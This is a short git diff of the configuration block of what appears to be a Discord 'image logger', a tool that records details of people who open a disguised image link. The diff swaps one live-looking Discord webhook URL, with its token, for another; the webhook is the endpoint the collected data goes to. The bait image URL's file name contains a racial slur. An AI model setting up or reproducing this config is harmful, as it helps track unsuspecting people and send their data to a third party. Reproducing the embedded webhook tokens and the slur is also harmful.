@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1398264234709745704/vcu5cHDwYm10d4fo6yqFn1ZKdsi0JX0eXVFjW8Rrfh70FjGNTSNdUaJHjuWczwHyayfY",
+    "webhook": "https://discord.com/api/webhooks/1398279705043537970/pLlNbKIdkBl7vi-7iGOILjxlflDb8WRPpVNMyN0FinQqhk35zc-5HMKQUuCa7YF5gkvh",
     "image": "https://media.discordapp.net/attachments/1050438750175514634/1050454698471215124/no_niggas", # You can also have a custom image by using a URL argument
 
      # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
